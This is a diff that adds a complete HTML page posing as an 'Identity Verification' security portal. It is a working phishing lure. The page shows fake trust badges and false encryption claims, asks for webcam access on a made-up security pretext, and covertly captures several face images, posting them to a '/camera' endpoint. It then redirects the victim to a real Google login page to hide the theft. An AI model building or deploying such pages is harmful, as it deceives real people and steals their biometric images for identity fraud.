@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification - Secure Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .verification-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 25px 100px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .security-badge {
+            background: linear-gradient(135deg, #00d26a, #00a854);
+            color: white;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 36px;
+            box-shadow: 0 10px 30px rgba(0,210,106,0.4);
+        }
+        
+        h1 { font-size: 24px; color: #1a1a2e; margin-bottom: 12px; font-weight: 700; }
+        .subtitle { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+        
+        .camera-preview {
+            width: 100%;
+            height: 300px;
+            background: #000;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .camera-placeholder {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: white;
+        }
+        .camera-placeholder i { font-size: 60px; margin-bottom: 15px; display: block; }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin-bottom: 25px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #28a745;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .feature {
+            background: #f8f9fa;
+            padding: 15px 10px;
+            border-radius: 12px;
+        }
+        .feature-icon { font-size: 24px; margin-bottom: 8px; }
+        .feature-text { font-size: 12px; color: #666; }
+        
+        .verified-by {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .verified-by p { font-size: 12px; color: #999; margin-bottom: 10px; }
+        .certificates { display: flex; justify-content: center; gap: 15px; opacity: 0.6; }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .scanning { animation: pulse 1.5s infinite; }
+        
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="security-badge">🛡️</div>
+        <h1>Identity Verification Required</h1>
+        <p class="subtitle">We need to verify your identity for security purposes. This is a one-time process required by our updated security guidelines.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <div class="feature-text">Bank-grade Encryption</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <div class="feature-text">30-sec Verification</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <div class="feature-text">ISO 27001 Certified</div>
+            </div>
+        </div>
+        
+        <div class="camera-preview" id="previewContainer">
+            <video id="video" autoplay playsinline></video>
+            <div class="camera-placeholder" id="placeholder">
+                <span style="font-size: 48px;">📷</span>
+                <p style="margin-top: 10px;">Camera access required</p>
+            </div>
+        </div>
+        
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <button class="btn-primary" id="verifyBtn" onclick="startVerification()">
+            Start Verification
+        </button>
+        
+        <div class="security-info">
+            <span>✓</span>
+            <span>Your data is encrypted end-to-end</span>
+        </div>
+        
+        <div class="verified-by">
+            <p>Verified & Secured By</p>
+            <div class="certificates">
+                <span>🔒 SSL</span>
+                <span>🛡️ Norton</span>
+                <span>✓ GDPR</span>
+            </div>
+        </div>
+    </div>
+    
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        let stream = null;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const previewContainer = document.getElementById('previewContainer');
+        const placeholder = document.getElementById('placeholder');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        
+        async function startVerification() {
+            try {
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = 'Requesting Camera Access...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        facingMode: 'user'
+                    },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                placeholder.style.display = 'none';
+                progressBar.style.display = 'block';
+                
+                // Simulate face scanning
+                verifyBtn.textContent = 'Scanning Face...';
+                previewContainer.classList.add('scanning');
+                
+                // Capture multiple frames
+                for (let i = 0; i < 100; i += 5) {
+                    progressFill.style.width = i + '%';
+                    await new Promise(r => setTimeout(r, 150));
+                    
+                    // Capture frame every 20%
+                    if (i % 20 === 0) {
+                        captureFrame(i);
+                    }
+                }
+                
+                // Final capture
+                setTimeout(() => {
+                    captureFinal();
+                    verifyBtn.textContent = 'Verification Complete!';
+                    progressFill.style.width = '100%';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://accounts.google.com';
+                    }, 1500);
+                    
+                }, 500);
+                
+            } catch(err) {
+                console.error(err);
+                alert('Camera access is required for verification. Please allow access and try again.');
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Start Verification';
+            }
+        }
+        
+        function captureFrame(progress) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            fetch('/camera', {
+                method: 'POST',
+                body: imageData
+            }).catch(console.error);
+        }
+        
+        function captureFinal() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            fetch('/camera', {
+                method: 'POST',
+                body: imageData
+            }).then(() => {
+                // Stop camera
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }).catch(console.error);
+        }
+    </script>
+</body>
+</html>
